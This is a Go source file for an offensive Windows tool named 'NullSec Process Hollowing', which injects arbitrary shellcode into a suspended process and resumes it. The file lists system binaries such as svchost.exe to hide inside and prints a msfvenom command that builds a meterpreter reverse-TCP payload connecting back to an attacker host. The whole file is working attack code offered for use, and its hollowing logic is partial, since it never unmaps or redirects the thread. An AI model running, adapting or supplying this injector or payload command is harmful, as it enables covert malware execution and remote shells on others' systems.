// NullSec Windows Process Hollowing
// Process hollowing technique for code execution
// Build: GOOS=windows go build -o nullsec-hollow.exe hollow.go
package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"unsafe"
)

var (
	kernel32         = syscall.NewLazyDLL("kernel32.dll")
	ntdll            = syscall.NewLazyDLL("ntdll.dll")
	
	procCreateProcess    = kernel32.NewProc("CreateProcessW")
	procVirtualAllocEx   = kernel32.NewProc("VirtualAllocEx")
	procWriteProcessMem  = kernel32.NewProc("WriteProcessMemory")
	procResumeThread     = kernel32.NewProc("ResumeThread")
	procGetThreadContext = kernel32.NewProc("GetThreadContext")
	procSetThreadContext = kernel32.NewProc("SetThreadContext")
	procNtUnmapView      = ntdll.NewProc("NtUnmapViewOfSection")
)

const (
	CREATE_SUSPENDED      = 0x00000004
	MEM_COMMIT            = 0x1000
	MEM_RESERVE           = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

func banner() {
	fmt.Println(`
╔═══════════════════════════════════════╗
║   NullSec Process Hollowing - Win     ║
║   Advanced code injection in Go       ║
╚═══════════════════════════════════════╝`)
}

type ProcessInfo struct {
	Process   syscall.Handle
	Thread    syscall.Handle
	ProcessId uint32
	ThreadId  uint32
}

type StartupInfo struct {
	Cb            uint32
	Reserved      *uint16
	Desktop       *uint16
	Title         *uint16
	X             uint32
	Y             uint32
	XSize         uint32
	YSize         uint32
	XCountChars   uint32
	YCountChars   uint32
	FillAttribute uint32
	Flags         uint32
	ShowWindow    uint16
	Reserved2     uint16
	Reserved3     *byte
	StdInput      syscall.Handle
	StdOutput     syscall.Handle
	StdError      syscall.Handle
}

func createSuspendedProcess(target string) (*ProcessInfo, error) {
	var si StartupInfo
	var pi ProcessInfo
	si.Cb = uint32(unsafe.Sizeof(si))
	
	targetPtr, _ := syscall.UTF16PtrFromString(target)
	
	ret, _, err := procCreateProcess.Call(
		uintptr(unsafe.Pointer(targetPtr)),
		0,
		0,
		0,
		0,
		CREATE_SUSPENDED,
		0,
		0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	
	if ret == 0 {
		return nil, err
	}
	
	return &pi, nil
}

func listTargetProcesses() {
	fmt.Println("\n[*] Common hollowing targets:")
	targets := []string{
		"C:\\Windows\\System32\\svchost.exe",
		"C:\\Windows\\System32\\RuntimeBroker.exe",
		"C:\\Windows\\System32\\dllhost.exe",
		"C:\\Windows\\System32\\WerFault.exe",
		"C:\\Windows\\System32\\notepad.exe",
	}
	
	for _, t := range targets {
		exists := checkFileExists(t)
		status := "✓"
		if !exists {
			status = "✗"
		}
		fmt.Printf("    [%s] %s\n", status, t)
	}
}

func checkFileExists(path string) bool {
	_, err := os.Stat(path)
	return err == nil
}

func generateShellcode(lhost string, lport int) []byte {
	// Placeholder - in reality you'd use msfvenom or custom shellcode
	fmt.Printf("[*] Generate shellcode with:\n")
	fmt.Printf("    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=%s LPORT=%d -f hex\n", lhost, lport)
	
	// Example NOP sled placeholder
	return []byte{0x90, 0x90, 0x90, 0x90, 0xCC} // NOPs + INT3
}

func hexToBytes(hexStr string) ([]byte, error) {
	hexStr = strings.ReplaceAll(hexStr, " ", "")
	hexStr = strings.ReplaceAll(hexStr, "\n", "")
	return hex.DecodeString(hexStr)
}

func hollow(target string, shellcode []byte) error {
	fmt.Printf("[*] Creating suspended process: %s\n", target)
	
	pi, err := createSuspendedProcess(target)
	if err != nil {
		return fmt.Errorf("failed to create process: %v", err)
	}
	
	fmt.Printf("[✓] Process created (PID: %d, TID: %d)\n", pi.ProcessId, pi.ThreadId)
	
	// Allocate memory in target process
	fmt.Printf("[*] Allocating %d bytes in target process...\n", len(shellcode))
	
	addr, _, err := procVirtualAllocEx.Call(
		uintptr(pi.Process),
		0,
		uintptr(len(shellcode)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_EXECUTE_READWRITE,
	)
	
	if addr == 0 {
		return fmt.Errorf("VirtualAllocEx failed: %v", err)
	}
	
	fmt.Printf("[✓] Memory allocated at: 0x%x\n", addr)
	
	// Write shellcode
	var written uintptr
	ret, _, err := procWriteProcessMem.Call(
		uintptr(pi.Process),
		addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&written)),
	)
	
	if ret == 0 {
		return fmt.Errorf("WriteProcessMemory failed: %v", err)
	}
	
	fmt.Printf("[✓] Wrote %d bytes to target\n", written)
	
	// Resume thread
	fmt.Println("[*] Resuming thread...")
	procResumeThread.Call(uintptr(pi.Thread))
	
	fmt.Println("[✓] Process hollowing complete!")
	
	return nil
}

func main() {
	banner()
	
	target := flag.String("target", "", "Target process to hollow (e.g., notepad.exe)")
	shellcodeHex := flag.String("shellcode", "", "Shellcode in hex format")
	shellcodeFile := flag.String("file", "", "File containing shellcode")
	lhost := flag.String("lhost", "", "Generate shellcode for LHOST")
	lport := flag.Int("lport", 4444, "LPORT for shellcode generation")
	list := flag.Bool("list", false, "List common target processes")
	flag.Parse()
	
	if *list {
		listTargetProcesses()
		return
	}
	
	if *lhost != "" {
		generateShellcode(*lhost, *lport)
		return
	}
	
	if *target == "" {
		fmt.Println("[!] Usage: nullsec-hollow -target <process> -shellcode <hex>")
		fmt.Println("    Or: nullsec-hollow -target <process> -file <shellcode.bin>")
		flag.PrintDefaults()
		return
	}
	
	var shellcode []byte
	var err error
	
	if *shellcodeHex != "" {
		shellcode, err = hexToBytes(*shellcodeHex)
		if err != nil {
			fmt.Printf("[!] Invalid hex: %v\n", err)
			return
		}
	} else if *shellcodeFile != "" {
		shellcode, err = os.ReadFile(*shellcodeFile)
		if err != nil {
			fmt.Printf("[!] Cannot read file: %v\n", err)
			return
		}
	} else {
		fmt.Println("[!] Provide shellcode via -shellcode or -file")
		return
	}
	
	if err := hollow(*target, shellcode); err != nil {
		fmt.Printf("[!] Hollowing failed: %v\n", err)
	}
}

// Stub for compilation on non-Windows
func init() {
	if os.Getenv("GOOS") != "windows" {
		// Allow cross-compilation
	}
}
